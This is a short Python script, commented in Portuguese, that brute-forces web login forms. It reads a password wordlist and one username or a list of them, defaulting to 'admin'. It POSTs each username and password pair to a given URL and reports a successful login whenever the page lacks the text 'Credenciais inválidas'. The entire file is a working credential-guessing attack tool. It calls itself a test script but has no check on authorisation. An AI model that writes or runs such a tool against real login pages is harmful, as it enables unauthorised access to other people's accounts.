import requests
import argparse

# Criar um objeto ArgumentParser
parser = argparse.ArgumentParser(description='Script para testar força bruta em login')

# Adicionar argumentos de linha de comando
parser.add_argument('url', help='URL do login')
parser.add_argument('wordlist', help='Caminho para o arquivo de wordlist')
parser.add_argument('-u', '--usuario', help='Nome de usuário')
parser.add_argument('-Uf', '--usuarios_arquivo', help='Caminho para o arquivo de usuários')

# Obter os argumentos de linha de comando
args = parser.parse_args()

# Definir a URL e a palavra de erro
url = args.url
erro = 'Credenciais inválidas'

# Ler a wordlist de senhas
with open(args.wordlist, 'r', encoding='ISO-8859-1') as arquivo:
    senhas = arquivo.read().splitlines()

# Ler a lista de usuários, se especificada
if args.usuarios_arquivo:
    with open(args.usuarios_arquivo, 'r', encoding='ISO-8859-1') as arquivo:
        usuarios = arquivo.read().splitlines()
else:
    usuarios = [args.usuario or 'admin']

# Iterar sobre as senhas e tentar fazer login com cada nome de usuário
for usuario in usuarios:
    for senha in senhas:
        # Enviar a requisição POST com as credenciais
        dados = {'username': usuario, 'password': senha}
        resposta = requests.post(url, data=dados)

        # Verificar se o login foi bem-sucedido
        if erro not in resposta.text:
            print(f'Login bem-sucedido: {usuario}:{senha}')
            break
    else:
        print(f'Nenhuma senha encontrada para o usuário {usuario}.')
